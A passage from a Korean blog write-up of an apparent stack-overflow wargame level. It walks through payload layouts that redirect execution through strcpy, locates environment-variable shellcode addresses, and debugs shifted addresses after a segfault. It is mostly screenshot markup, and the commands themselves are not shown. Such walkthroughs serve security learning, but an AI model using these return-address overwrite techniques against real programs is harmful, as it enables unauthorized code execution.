url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAXklEQVR42lXBQQ7EIAgAQPQCVgtd0UQoTer/P7nJ3nYG/Hb96b3LJb1/WmuqOsYQEVVFxFLKUY9aKxISETMT4d4v7L0jwszcfa1lZvFExM3CcgnzmXOGfyklAJhzfgHgvQbwxhUYnAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/8ef19b2331ac17bf0ec2abbddbd4c282/c9b55/1.webp 165w,\n/static/8ef19b2331ac17bf0ec2abbddbd4c282/f2908/1.webp 330w,\n/static/8ef19b2331ac17bf0ec2abbddbd4c282/ff4b8/1.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/8ef19b2331ac17bf0ec2abbddbd4c282/04c57/1.png 165w,\n/static/8ef19b2331ac17bf0ec2abbddbd4c282/d9ecf/1.png 330w,\n/static/8ef19b2331ac17bf0ec2abbddbd4c282/32056/1.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/8ef19b2331ac17bf0ec2abbddbd4c282/32056/1.png\"\n            alt=\"run_nightmare\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>우회에 성공하였다(You must fall in love with strcpy()이라는 문구가 뜨지 않음).\r\n소스코드에 따르면 원래 스택은 아래와 같이 구성될 것이다.</p>\n<p>| buffer[40] | SFP[4] | Ret[4] | AAAA[4] | ... |</p>\n<p>이를 strcpy 함수로 ret를 우회하면 아래와 같이 구성될 것이다.</p>\n<p>| A * 44 | strcpy (0x08048410) | AAAA | ... |</p>\n<p>strcpy 뒤에 memset으로 인해 만들어지는 AAAA는 strcpy가 호출된 이후 돌아오는 ret가함수된다. 그리고 함수의 인자가 어떤 방식으로 삽입되는지는 이전에 execve를 조작하면서 알아본 바 있다(bugbear -> giant 문제). 아래는 이를 확인하기 위해 BBBB와 CCCC를 추가적으로 삽입해 보는 과정이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 293px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.878787878787882%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAA7CAAAOwgEVKEqAAAAA+UlEQVR42nWQ7YqDMBBF1VVTih+J0SQTo7Xtvv8rnsUsLIVuf1wYhrnnDrcIEggiLMuCiNC2Ci+C957JzkxG47zH6JGyKCjKimmakBizpzh3r9r2RNo2nHPcjhtKtazbxu048EEIwSFxZRyHbCirKt9LCDR1/Q60dspJo9b5K20Mx/1gTSs+BPq+I6ZESpGm+QVcr9e/+U2Lcxgz0g89drYZtO8bclaRgT3GWiQKl4v6H/Kqx/eTeZ7QeqTrOtK+E2PAzjN2WfDeUddflGVJ3TQopSjL6jPw7On5OFijENeI0QNNq9Da5BCtNcf9ztn1WcmaEuMwfAT+AKonisqUORaVAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/06a396185783838c3d036ddcd790cb4f/c9b55/2.webp 165w,\n/static/06a396185783838c3d036ddcd790cb4f/2b735/2.webp 293w\"\n              sizes=\"(max-width: 293px) 100vw, 293px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/06a396185783838c3d036ddcd790cb4f/04c57/2.png 165w,\n/static/06a396185783838c3d036ddcd790cb4f/3cf3e/2.png 293w\"\n            sizes=\"(max-width: 293px) 100vw, 293px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/06a396185783838c3d036ddcd790cb4f/3cf3e/2.png\"\n            alt=\"disas\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>leave 부분에 breakpoint를 걸고 다음과 같은 페이로드를 만들어 삽입해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 35.151515151515156%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAA7CAAAOwgEVKEqAAAABE0lEQVR42nVS2Y6DMAwMRwlnEshBQsK23f7/N87KrroPK/bBGkfCc9gI7z26rsM0TZjnmftlmflNJaVkVEpBacU4DAOWZYFSC/chBNR1je/XC6KcBaUU5JyxxwjnHI6cGZ/PB9KR4INHLhlaa4zjiGkamaAfehaUvYQQgnkEDZJL6yw2u8GHwGTWWu7XdYU2BsYYaKMxjCMPXxXNiSMf2LaVo0rZcWxS7fu3etPU/xJ8qqoqRjIm7o87NzFGeO8Q9oA97nDeIaaIlBKM0bw7EqDh2+3GkS8JyVGMO+/w/DpBjnMpjJ93CJ4PRbFJkI7TNM01IUVt25Y/Ps+THcWU3g7jDmu33z+ADkJF65jnidf0l/AHyKWhX4ImutoAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/0fc5763de52572d3f1fa3480a7e47e31/c9b55/3.webp 165w,\n/static/0fc5763de52572d3f1fa3480a7e47e31/f2908/3.webp 330w,\n/static/0fc5763de52572d3f1fa3480a7e47e31/ff4b8/3.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/0fc5763de52572d3f1fa3480a7e47e31/04c57/3.png 165w,\n/static/0fc5763de52572d3f1fa3480a7e47e31/d9ecf/3.png 330w,\n/static/0fc5763de52572d3f1fa3480a7e47e31/32056/3.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/0fc5763de52572d3f1fa3480a7e47e31/32056/3.png\"\n            alt=\"r\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>src, dest를 마음대로 조작할 수 있다는 것을 알 수 있다.</p>\n<p>| A * 44 | strcpy(0x08048410) | \\x90\\x90\\x90\\x90 | BBBB | CCCC | ... |</p>\n<p>쉘코드를 환경변수로 만들었다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 14.545454545454545%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAA7CAAAOwgEVKEqAAAAAi0lEQVR42nWLORKEMAwEjal1ALbAB7ZkEnjE8v+fzRYiItigS8dMG2YGc4NOYdTWsNUNvTO2WiEimouwdmKKutda0Zg13/cO6YLr+sKUUnCTUkLOWYUYI0rJWNYVzjmEEBQignMfGGMwDMOL+3eeJ4z3HoEIfp4fkR6RFsI0zVocR6uStVbvfxzHgR9e2EYOAR+xrgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/7026b279b1dbdc736989539539ad1ba6/c9b55/4.webp 165w,\n/static/7026b279b1dbdc736989539539ad1ba6/f2908/4.webp 330w,\n/static/7026b279b1dbdc736989539539ad1ba6/ff4b8/4.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/7026b279b1dbdc736989539539ad1ba6/04c57/4.png 165w,\n/static/7026b279b1dbdc736989539539ad1ba6/d9ecf/4.png 330w,\n/static/7026b279b1dbdc736989539539ad1ba6/32056/4.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/7026b279b1dbdc736989539539ad1ba6/32056/4.png\"\n            alt=\"export\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>leave 하는 지점에 breakpoint를 만든 후, strcpy의 ret, strcpy의 인자가 어느 주소에 위치하는지를 확인하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 37.57575757575758%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAA7CAAAOwgEVKEqAAAABR0lEQVR42m1S25aDIAxEvAuCCCJeWnH7/984e5K2T7sPOYcJZGaSINY1IqUV+3Fgnh2myaLve8iyRFEUkFKiqkqU5TsIU76qaxRSoq5rSFlwru06iLZtodQAPWrQ2U4WWmsopRh3XQtjRlhrYYzhfNd1cPPMwiEEaK347JyDoAS59CFgcg7LsnAc7HjG7Gd+aKxhorfYwE6HYUDTNCxC7pVWEGtasW0bK60pYdt3xDXyCHzwSNvGguTIe89BboQQf4LaF9QKKXBLHxdUQE5I/fuYZvQfyR/Cx+OBEDxGY7jVyU0Yx5EfvIUMk38LCBtrP8uRjMkM3VVVBfHzevF2qYDavPKFGCPjJUbknDlPmIjznTlH7suyQs4X7vvmO5qjuHKGcxMXpC3hPE+EJTCmhRznAZoz4X4YQB09n080Tc1f6zh2xl/CX5bvtxitEwfJAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/a65abbeac98946206649778b94d468e2/c9b55/5.webp 165w,\n/static/a65abbeac98946206649778b94d468e2/f2908/5.webp 330w,\n/static/a65abbeac98946206649778b94d468e2/ff4b8/5.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/a65abbeac98946206649778b94d468e2/04c57/5.png 165w,\n/static/a65abbeac98946206649778b94d468e2/d9ecf/5.png 330w,\n/static/a65abbeac98946206649778b94d468e2/32056/5.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/a65abbeac98946206649778b94d468e2/32056/5.png\"\n            alt=\"memory\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>또한 환경변수가 위치하는 주소를 알아보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 555px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 31.51515151515152%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAA7CAAAOwgEVKEqAAAAA1klEQVR42pWQWW6EMBBEvbF5YERGwRtrxJD73/BFdnIA8lEqdbf6qVQixECW847OdvTDQEyR1+sDIcT/5b0jzonJOeTfMoRA8I62bamqiq5rkVLeA67byrbvpHnGGI0QkmVZOd8n+TaOI9ba+wmPr4PzerPtG0ZrhJQcx8H1fbHvG/MyF+htYIyBZV2JMaKUQkhVOvTB47wnVzIMA/ZhS9JcQ9M0xe3jwfM5UNc1nbUoJRH5MQOcc+gMFKLMKSWm6ZO+76nrqsDyozEGrXXpVhX/nbNywh/WQYW1yxQ1lAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/72a1d9d95d17881e5ef6300240e409b5/c9b55/6.webp 165w,\n/static/72a1d9d95d17881e5ef6300240e409b5/f2908/6.webp 330w,\n/static/72a1d9d95d17881e5ef6300240e409b5/2e9dd/6.webp 555w\"\n              sizes=\"(max-width: 555px) 100vw, 555px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/72a1d9d95d17881e5ef6300240e409b5/04c57/6.png 165w,\n/static/72a1d9d95d17881e5ef6300240e409b5/d9ecf/6.png 330w,\n/static/72a1d9d95d17881e5ef6300240e409b5/cd039/6.png 555w\"\n            sizes=\"(max-width: 555px) 100vw, 555px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/72a1d9d95d17881e5ef6300240e409b5/cd039/6.png\"\n            alt=\"memory_env\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>환경변수로 입력해둔 쉘코드의 위치는 0xbfffff60임을 확인하였다. 이 주소를 다시한번 환경변수로 만들어 두었다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 10.303030303030305%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAA7CAAAOwgEVKEqAAAAAWUlEQVR42nWKOw7AIAxDs1BIgZAEBu5/UVekUrcO1vOPWmtQVZg7zAwiEll1BM9++qEjeHLOGbVWlFLQe38lEh3NtbD3hk//ToU5yMxIKeG6UnjmO0hEv3oAWBcswp5yzWYAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/bf351c31aeaa21243698152dd572e615/c9b55/7.webp 165w,\n/static/bf351c31aeaa21243698152dd572e615/f2908/7.webp 330w,\n/static/bf351c31aeaa21243698152dd572e615/ff4b8/7.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/bf351c31aeaa21243698152dd572e615/04c57/7.png 165w,\n/static/bf351c31aeaa21243698152dd572e615/d9ecf/7.png 330w,\n/static/bf351c31aeaa21243698152dd572e615/32056/7.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/bf351c31aeaa21243698152dd572e615/32056/7.png\"\n            alt=\"export2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>쉘코드의 주소를 입력한 환경변수의 주소를 확인하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 581px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 18.78787878787879%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAA7CAAAOwgEVKEqAAAAAwklEQVR42m2PzY7CMAyEkza0adO0DTE4P4C0lMuK93++QbHEafcwGo0lj/2plBOYr/DeIxKBE2PdVizOwVoLa0csy4JhGDBNE5yb4ZzDPM/Ytg0hBOz7LrnrOqhcCs4hQCklYmZwSqi1gohwuZDMiM7o+16WmhtjMI6jHG3esnT8HAdqKdBawZxOeL0O/L7feB5P1FrweNyRUsLtfkMuGTFGKfk+8EftQ6IooTdG8HMuuDILdsNtBc396gWtSWv9b+EHYKVb2Y70qZUAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/a7974b723be51bb61ea596ebc6635524/c9b55/8.webp 165w,\n/static/a7974b723be51bb61ea596ebc6635524/f2908/8.webp 330w,\n/static/a7974b723be51bb61ea596ebc6635524/39daa/8.webp 581w\"\n              sizes=\"(max-width: 581px) 100vw, 581px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/a7974b723be51bb61ea596ebc6635524/04c57/8.png 165w,\n/static/a7974b723be51bb61ea596ebc6635524/d9ecf/8.png 330w,\n/static/a7974b723be51bb61ea596ebc6635524/92d15/8.png 581w\"\n            sizes=\"(max-width: 581px) 100vw, 581px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/a7974b723be51bb61ea596ebc6635524/92d15/8.png\"\n            alt=\"memory_env2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 232px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15.75757575757576%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAA7CAAAOwgEVKEqAAAAAmklEQVR42m2Ny26DQBDAoDTtpSlD2Ae77MwQCP//ia6USxSpB98suxtFWEqh1MLn8IFMEylGvr8uLLWyuVLWhpqScibEhMgvXdf9T9PGeR7cj52UImZGzpkYA3OYSTEwTTduYUa14duGuzLKiIg8uV5/XsFVlfNxZ6kr6kaplWZO08plGN7uS8nsx04zxTZH3TF3co70ff/0/gAle0jS9dE9KwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/3ef45d01e481e74d5500ce315a68bd0d/c9b55/9.webp 165w,\n/static/3ef45d01e481e74d5500ce315a68bd0d/af5b6/9.webp 232w\"\n              sizes=\"(max-width: 232px) 100vw, 232px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/3ef45d01e481e74d5500ce315a68bd0d/04c57/9.png 165w,\n/static/3ef45d01e481e74d5500ce315a68bd0d/6a451/9.png 232w\"\n            sizes=\"(max-width: 232px) 100vw, 232px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/3ef45d01e481e74d5500ce315a68bd0d/6a451/9.png\"\n            alt=\"memory\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>쉘코드의 주소는 0xbfffff60, 쉘코드의 주소가 입력된 주소는 0xbffffca2이다. 이것들을 가지고 공격을 시도해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 10.303030303030305%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAA7CAAAOwgEVKEqAAAAAbklEQVR42mWN2wrDIBQEhQYUIYkipHqON9L//8Ypkb71Ydh9mV2Tc0arcn9urveFqtBHp5TCmINcMkUK89dFhZQS3nustYt931fOOTGP1Hqj1oqILFlU12jrneM8CTESYySEgHOO7bVhjPnjOfoCzgQw34hvL1QAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/ab59f63b5c7df3c563b2a6b99eef546b/c9b55/10.webp 165w,\n/static/ab59f63b5c7df3c563b2a6b99eef546b/f2908/10.webp 330w,\n/static/ab59f63b5c7df3c563b2a6b99eef546b/ff4b8/10.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/ab59f63b5c7df3c563b2a6b99eef546b/04c57/10.png 165w,\n/static/ab59f63b5c7df3c563b2a6b99eef546b/d9ecf/10.png 330w,\n/static/ab59f63b5c7df3c563b2a6b99eef546b/32056/10.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/ab59f63b5c7df3c563b2a6b99eef546b/32056/10.png\"\n            alt=\"exploit\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>| A * 44 | strcpy | AAAA | 0xbffffa90 | 0xbffffca2 | ... |\r\n| --- | --- | --- |\r\n| dummy |  | Strcpy의 ret | Strcpy의 dest | Strcpy의 src |  |</p>\n<p>쉘코드의 주소가 입력되어있는 주소를 strcpy가 실행된 후 돌아오는 return address(AAAA)의 위치인 0xbffffa90에 입력하겠다는 의미이다. 하지만 seg fault가 발생하여 core dump를 분석해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 598px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 29.6969696969697%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAA7CAAAOwgEVKEqAAAABCklEQVR42j1RV3aEMAw0JSyE4gIu2KZtkvsfcfIkQv4sazRFEvuxI6YIay2GoUfKGduxYxwHCCHQvF6QSkEqibquUBQFlFJQWqNtW8b0fQ8pJwzDABGCR8oJ4zhyU2mFNUaY2XD92fdYUwThPuoaZVVijSsLT9PEGG0M/83LAkHuqKm15uZiF6Qts+NHPW8ZPgTU/4SRUz0mzDwjEiGZuN4Xvn6+sfwRhDXgfF/wwXM9SYnjPJigaRomzdvGIhSdMM57xljnIWiHx3XCmDuidRYxJValmlwQATkkwqqqeEWU6iHkVDndppxzDB6n2z4dgABSSq67ruM+CXHksuS3de4+As1ICecdz/4CvYyOvP5BhjkAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/8d2c065b6cb3590f782462864f81bdc5/c9b55/11.webp 165w,\n/static/8d2c065b6cb3590f782462864f81bdc5/f2908/11.webp 330w,\n/static/8d2c065b6cb3590f782462864f81bdc5/83245/11.webp 598w\"\n              sizes=\"(max-width: 598px) 100vw, 598px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/8d2c065b6cb3590f782462864f81bdc5/04c57/11.png 165w,\n/static/8d2c065b6cb3590f782462864f81bdc5/d9ecf/11.png 330w,\n/static/8d2c065b6cb3590f782462864f81bdc5/0c69d/11.png 598w\"\n            sizes=\"(max-width: 598px) 100vw, 598px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/8d2c065b6cb3590f782462864f81bdc5/0c69d/11.png\"\n            alt=\"memory2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>strcpy의 ret의 위치가 0xbffffa90에서 0xbffffa80으로 바뀌어 있음을 알 수 있다. 환경변수의 주소지들도 바뀌어 있을 것을 우려하여 다시한번 확인해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 561px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.060606060606062%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAA7CAAAOwgEVKEqAAAAAsUlEQVR42o3Qwa6DIBSEYT0mggqWJkWxQLDG5r7/E/43sujaxSzOLL5MTvOOb668/Itpmng4R8qJ59NhrUFEaJrmftawUvaCX/yvjDFy9c49UEoxDMN98FoXc8IvC10ntK2QcqbsOyEEjDEVvQ3un53v35eUcgVFOo7j4DxPSin1HfNs74NhC8SUWNaVToRWhG3b6uI1BLz3WGuZzMQ4jvRKobWmVz3zPNe/X7cedAX/AWPbb3hdqHUJAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/3fde82eb79fc6b26522bfe9b356fd685/c9b55/12.webp 165w,\n/static/3fde82eb79fc6b26522bfe9b356fd685/f2908/12.webp 330w,\n/static/3fde82eb79fc6b26522bfe9b356fd685/6c067/12.webp 561w\"\n              sizes=\"(max-width: 561px) 100vw, 561px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/3fde82eb79fc6b26522bfe9b356fd685/04c57/12.png 165w,\n/static/3fde82eb79fc6b26522bfe9b356fd685/d9ecf/12.png 330w,\n/static/3fde82eb79fc6b26522bfe9b356fd685/410f3/12.png 561w\"\n            sizes=\"(max-width: 561px) 100vw, 561px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/3fde82eb79fc6b26522bfe9b356fd685/410f3/12.png\"\n            alt=\"memory_env3\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>쉘코드의 위치가 0xbfffff60에서 0xbfffff65로 바뀌어 있는 것을 확인하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 431px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.060606060606062%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAA7CAAAOwgEVKEqAAAAA8ElEQVR42j2Q646EIAyFcbzLsFERBAUEZzbZef8HPJvixB8NtNB+p4dt+watFaScMc0ThBCYpYSxBsZaDEOPuq7RNE0Ourddh77vc7TtVa+qCkVRgJ2vBOc9XPB5KGMsh9Yr/j4f7PuG3e1fgMHuNvgQcL5OjNOIrutu0OPxAIspwnmHcAQopS4KY5CLyk1HjIgpYV01VrNCa53/0fkUIisry/IWwmI6skKiqmVB8X2Qy4IYI96/bxBUSgm7bbDW3AOpj2oEGzi/Bqczgnx0IWCR8iaN4wgfPJzzufHJh6yIPCXvOOcQPyKvTD5STiv/A2NieBH3HApFAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/6a0d4d326766d5bae6251705329ce18d/c9b55/13.webp 165w,\n/static/6a0d4d326766d5bae6251705329ce18d/f2908/13.webp 330w,\n/static/6a0d4d326766d5bae6251705329ce18d/01668/13.webp 431w\"\n              sizes=\"(max-width: 431px) 100vw, 431px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/6a0d4d326766d5bae6251705329ce18d/04c57/13.png 165w,\n/static/6a0d4d326766d5bae6251705329ce18d/d9ecf/13.png 330w,\n/static/6a0d4d326766d5bae6251705329ce18d/9cb4e/13.png 431w\"\n            sizes=\"(max-width: 431px) 100vw, 431px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/6a0d4d326766d5bae6251705329ce18d/9cb4e/13.png\"\n            alt=\"memory_env4\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>쉘코드의 주소를 입력해둔 환경변수 shelladdr의 위치 또한 0xbffffca2에서 0xbffffc91로 바뀌어 있다. 이를 다시 입력하고 바뀐 주소지로 공격을 시도해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 22.424242424242426%; position: relative; bottom: 0; left: 0; background-image: 